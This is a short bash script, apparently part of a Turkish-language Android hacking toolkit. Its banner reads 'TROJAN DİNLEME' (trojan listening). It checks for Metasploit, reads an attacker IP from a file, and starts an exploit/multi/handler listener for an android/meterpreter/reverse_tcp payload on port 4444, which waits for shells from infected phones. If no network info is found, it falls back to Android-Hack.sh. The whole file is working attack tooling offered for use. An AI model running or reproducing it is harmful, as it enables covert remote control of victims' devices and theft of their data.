#!/bin/bash
if [[ ! -a $PREFIX/bin/msfconsole ]];then
	echo
	echo
	echo
	printf "\e[31m[!] \e[97mMSFCONSOLE BULUNAMADI"
	echo
	echo
	echo
	exit
fi
clear
echo
echo
echo
echo
printf "\e[32m████████████████████  \e[1;4;33mTROJAN DİNLEME\e[0;32m  █████████████████████\e[97m"
echo
echo
echo
echo
sleep 0.5
if [[ -a info ]];then
	ip=$(sed -n 1p info)
	control=$(cat info |wc -m)
	if [[ $control -gt 1 ]];then
		echo
		echo
		echo
		printf "\e[33m[*]\e[97m MSFCONSOLE AÇILIYOR.."
		echo
		echo
		echo
		sleep 0.5
		msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost $ip; set lport 4444; exploit;"
		exit
	fi
else
	echo
	echo
	echo
	printf "\e[31m[!]\e[97m AĞ BİLGİLERİ BULUNAMADI\e[31m!!!\e[97m"
	echo
	echo
	echo
	sleep 3
	cd ..
	bash Android-Hack.sh
	exit
fi
